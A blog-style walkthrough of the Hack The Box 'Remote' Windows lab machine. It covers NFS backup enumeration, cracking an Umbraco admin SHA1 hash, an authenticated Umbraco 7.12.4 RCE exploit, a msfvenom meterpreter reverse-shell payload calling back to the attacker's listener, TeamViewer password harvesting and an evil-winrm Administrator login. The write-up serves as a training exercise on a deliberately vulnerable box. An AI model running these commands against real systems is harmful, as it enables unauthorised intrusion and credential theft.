---
title:  "HTB Remote"
date:  2020-09-06 01:10:00 +0930
tags: [HTB]
---

From my experience Windows boxes are either incredibly easy or incredibly hard. This one is the former, a great beginner box. Here you practice researching what you find out about the server from enumeration. As well as get introduced to tools you might regulary use in pentesting Windows boxes.

***

![](/images/HTB_Remote/HTB_Remote.png)

## Enumeration
We start of with an nmap scan.
{% highlight bash %}
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 01:15 EDT
Nmap scan report for 10.10.10.180
Host is up (0.32s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:                                                                                                       
|_clock-skew: 5m55s                                                                                                        
| smb2-security-mode:                                                                                                      
|   2.02:                                                                                                                  
|_    Message signing enabled but not required                                                                             
| smb2-time:                                                                                                               
|   date: 2020-08-27T05:22:41                                                                                              
|_  start_date: N/A                                                                                                        

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                             
Nmap done: 1 IP address (1 host up) scanned in 281.82 seconds    
{% endhighlight %}

Port 2049 being open stands out to me so I run another nmap scan. The FTP would be worth investigating and we should check out the page that is being served.

{% highlight bash %}
kali@kali:~$ nmap --script=nfs-showmount 10.10.10.180                                                                  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 01:24 EDT                                                            
Nmap scan report for 10.10.10.180                                                                                          
Host is up (0.32s latency).                                                                                                
Not shown: 993 closed ports                                                                                                
PORT     STATE SERVICE                                                                                                     
21/tcp   open  ftp
80/tcp   open  http
111/tcp  open  rpcbind
| nfs-showmount:
|_  /site_backups
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
{% endhighlight %}

![](/images/HTB_Remote/HTB_Remote_1.png)

Hmm "site backups" sounds juicy to me, the webstie looks like somekind of company website. The NFS share sounds like it would be more worth investigating than the FTP with anonymous login. So I mount the share:

{% highlight bash %}
kali@kali:~$ sudo mount -t nfs 10.10.10.180:/site_backups /mnt
kali@kali:~$ cd /mnt
kali@kali:/mnt$ ls -l
total 115
drwx------ 2 nobody 4294967294    64 Feb 20  2020 App_Browsers
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 App_Data
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 App_Plugins
drwx------ 2 nobody 4294967294    64 Feb 20  2020 aspnet_client
drwx------ 2 nobody 4294967294 49152 Feb 20  2020 bin
drwx------ 2 nobody 4294967294  8192 Feb 20  2020 Config
drwx------ 2 nobody 4294967294    64 Feb 20  2020 css
-rwx------ 1 nobody 4294967294   152 Nov  1  2018 default.aspx
-rwx------ 1 nobody 4294967294    89 Nov  1  2018 Global.asax
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 Media
drwx------ 2 nobody 4294967294    64 Feb 20  2020 scripts
drwx------ 2 nobody 4294967294  8192 Feb 20  2020 Umbraco
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 Umbraco_Client
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 Views
-rwx------ 1 nobody 4294967294 28539 Feb 20  2020 Web.config
{% endhighlight %}

What stands out is "Umbraco" which is a CMS. Looking through the website we can see they haven't finished it, we can see notes to the site builder to complete certain pages inside the CMS platform.

![](/images/HTB_Remote/HTB_Remote_2.png)

Following this link we can see the CMS's login page.

![](/images/HTB_Remote/HTB_Remote_3.png)

We need to enumerate that NFS we mounted. There's many ways we could do this. One of the things I tried was to look for the word "admin" in any files.

{% highlight bash %}
kali@kali:/mnt$ grep -r -l "admin"
...                                                                        
App_Data/umbraco.config                                                                                                    
App_Data/Umbraco.sdf                                                                                                       
...
{% endhighlight %}

I have omitted the rest of the output to save space just to show you the two files that stood out to me, next I ran the following two commands:

{% highlight bash %}
kali@kali:/mnt/App_Data$ strings Umbraco.config | grep admin

kali@kali:/mnt/App_Data$ strings Umbraco.sdf | grep admin

{% endhighlight %}

Skimming through the output of both I come across the following line in the "Umbraco.sdf" file:

{% highlight bash %}
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
{% endhighlight %}

***b8be16afba8c314ad33d812f22a04991b90e2aaa*** must be a SHA1 hash. We can confirm by seeing how many characters it is.

I head over to [https://md5decrypt.net/en/Sha1/](https://md5decrypt.net/en/Sha1/)

Decrypting it we get the password: ***baconandcheese***

Remember from the string the username was: ***admin@htb.local***

We can now login on that CMS login page we found earlier.

![](/images/HTB_Remote/HTB_Remote_4.png)

Note there is a "Media" section where we can upload files and we see the version of the software the server is running: ***Umbraco version 7.12.4***

Let's see if there is any exploits found already for this software:

{% highlight bash %}
kali@kali:~$ searchsploit umbraco
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                                      | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                               | aspx/webapps/46153.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                               | php/webapps/44988.txt
----------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
{% endhighlight %}

We see there is an remote code execution exploit for this exact version. Note that we need to be authenticated, which we got the credentials to login earlier.

## User
I start of by searching for ***umbraco 7.12.4 rce*** (I use DuckDuckGo) and find that the code is on github: [https://github.com/noraj/Umbraco-RCE](https://github.com/noraj/Umbraco-RCE)

I familiarise myself with how it works, see the ***Usage*** and ***Examples*** sections.

I then download a copy of this code and try it out:

{% highlight bash %}
kali@kali:~$ cd HTB/Remote/
kali@kali:~/HTB/Remote$ wget https://raw.githubusercontent.com/noraj/Umbraco-RCE/master/exploit.py
--2020-08-27 03:12:38--  https://raw.githubusercontent.com/noraj/Umbraco-RCE/master/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.80.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.80.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3202 (3.1K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                     100%[===================================================>]   3.13K  --.-KB/s    in 0s      

2020-08-27 03:12:39 (40.6 MB/s) - ‘exploit.py’ saved [3202/3202]

kali@kali:~/HTB/Remote$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'whoami'
iis apppool\defaultapppool
{% endhighlight %}

From here we can try going for the user flag:

{% highlight bash %}
kali@kali:~/HTB/Remote$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "dir c:/Users/Public"


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        2/19/2020   3:03 PM                Documents                                                             
d-r---        9/15/2018   3:19 AM                Downloads                                                             
d-r---        9/15/2018   3:19 AM                Music                                                                 
d-r---        9/15/2018   3:19 AM                Pictures                                                              
d-r---        9/15/2018   3:19 AM                Videos                                                                
-ar---        8/27/2020   2:15 AM             34 user.txt                                                              



kali@kali:~/HTB/Remote$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "type c:/Users/Public/user.txt"
d9------------------------------
{% endhighlight %}

Awesome we got the user flag :)

## Root

Unfortunatly we don't have full access to the machine yet:

{% highlight bash %}
kali@kali:~/HTB/Remote$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "dir c:/Users/Administrator"
dir : Access to the path 'C:\Users\Administrator' is denied.
At line:1 char:1
+ dir c:/Users/Administrator
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessExc
   eption
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
{% endhighlight %}

Recall that we can upload to the server using the Media tab on the CMS portal. So I wip up a reverse tcp exe using msfvenom:

{% highlight bash %}
kali@kali:~/HTB/Remote$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.30 LPORT=4444 -f exe > final.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
{% endhighlight %}

And upload it to the server:

![](/images/HTB_Remote/HTB_Remote_5.png)

Note you need to click the little ***i*** icon next the file name to get information on the file to see where it uploaded it.

![](/images/HTB_Remote/HTB_Remote_6.png)

Note: ***/media/1033/***

We can confirm this using the exploit we previously used:

{% highlight bash %}
kali@kali:~/HTB/Remote$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "dir c:/inetpub/wwwroot/media/1033"


    Directory: C:\inetpub\wwwroot\media\1033


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        8/27/2020   3:58 AM          73802 final.exe
{% endhighlight %}

Next, in a new console window, we fire up msfconsole and set it to listen for the connection from that exe we just uploaded.

{% highlight bash %}
kali@kali:~$ msfconsole

  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: You can use help to view all available commands

msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 10.10.14.30
lhost => 10.10.14.30
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > run                                                                                          

[*] Started reverse TCP handler on 10.10.14.30:4444
{% endhighlight %}

Using the exploit we remotely run the exe we just uploaded:

{% highlight bash %}
kali@kali:~/HTB/Remote$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "c:/inetpub/wwwroot/media/1033/final.exe"
{% endhighlight %}

And we get a meterpreter session going:

{% highlight bash %}
[*] Started reverse TCP handler on 10.10.14.30:4444                                                                        
[*] Sending stage (176195 bytes) to 10.10.10.180                                                                           
[*] Meterpreter session 1 opened (10.10.14.30:4444 -> 10.10.10.180:49719) at 2020-08-27 04:06:02 -0400                     

meterpreter >      
{% endhighlight %}

Lets see if we can get root:

{% highlight bash %}
meterpreter > shell                                                                                                        
Process 1760 created.                                                                                                      
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

C:\windows\system32\inetsrv>cd c:/Users/Administrator
cd c:/Users/Administrator
Access is denied.

C:\windows\system32\inetsrv>
{% endhighlight %}

Unfortunately we cannot so let's have a look around:

{% highlight bash %}
C:\windows\system32\inetsrv>cd c:/Program Files (x86)
cd c:/Program Files (x86)

c:\Program Files (x86)>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE23-EB3E

 Directory of c:\Program Files (x86)

02/23/2020  03:19 PM    <DIR>          .
02/23/2020  03:19 PM    <DIR>          ..
09/15/2018  03:28 AM    <DIR>          Common Files
09/15/2018  05:06 AM    <DIR>          Internet Explorer
02/23/2020  03:19 PM    <DIR>          Microsoft SQL Server
02/23/2020  03:15 PM    <DIR>          Microsoft.NET
02/19/2020  04:11 PM    <DIR>          MSBuild
02/19/2020  04:11 PM    <DIR>          Reference Assemblies
02/20/2020  03:14 AM    <DIR>          TeamViewer
09/15/2018  05:05 AM    <DIR>          Windows Defender
09/15/2018  03:19 AM    <DIR>          Windows Mail
10/29/2018  06:39 PM    <DIR>          Windows Media Player
09/15/2018  03:19 AM    <DIR>          Windows Multimedia Platform
09/15/2018  03:28 AM    <DIR>          windows nt
10/29/2018  06:39 PM    <DIR>          Windows Photo Viewer
09/15/2018  03:19 AM    <DIR>          Windows Portable Devices
09/15/2018  03:19 AM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              17 Dir(s)  19,408,666,624 bytes free

c:\Program Files (x86)>
{% endhighlight %}

Looks like this server has team viewer on it:
{% highlight bash %}
c:\Program Files (x86)>cd TeamViewer
cd TeamViewer

c:\Program Files (x86)\TeamViewer>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE23-EB3E

 Directory of c:\Program Files (x86)\TeamViewer

02/20/2020  03:14 AM    <DIR>          .
02/20/2020  03:14 AM    <DIR>          ..
02/27/2020  11:35 AM    <DIR>          Version7
               0 File(s)              0 bytes
               3 Dir(s)  19,401,138,176 bytes free

c:\Program Files (x86)\TeamViewer>
{% endhighlight %}

Meterpreter has an inbuilt tool to gather TeamViewer passwords:

{% highlight bash %}
c:\Program Files (x86)\TeamViewer>exit
exit
meterpreter > run post/windows/gather/credentials/teamviewer_passwords

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
[+] Passwords stored in: /home/kali/.msf4/loot/20200827043402_default_10.10.10.180_host.teamviewer__775352.txt
[*] <---------------- | Using Window Technique | ---------------->
[*] TeamViewer's language setting options are ''
[*] TeamViewer's version is ''
[-] Unable to find TeamViewer's process
meterpreter >
{% endhighlight %}

Next we will use a tool called Evil WinR. Information on this tool; how to install and use it, can be found on it's github repo page: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

{% highlight bash %}
kali@kali:~$ evil-winrm -u 'Administrator' -p '!R3m0te!' -i '10.10.10.180'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
remote\administrator
{% endhighlight %}

And from here we can get the root flag:

{% highlight bash %}
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/27/2020   4:23 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
61------------------------------
{% endhighlight %}

Awesome! We have now completed this box. :)

## Conclusion
So the box is called "Remote" cos we exploited the admin's remote tools to get full access. In terms of leaving a backup exposed like that is pretty careless and I would like to think you an admin would get fired for doing something so stupid. From the backup we found the hash for getting into the CMS platform. From there we were able to upload an exploit we made in Meterpreter. Meterpreter has a lot of inbuilt tools you will use a lot one of which we used to get the Team Viewer password. From there we used another tool that exploits Windows Remote Management with the Team Viewer credentials we dug up to finally get full access.
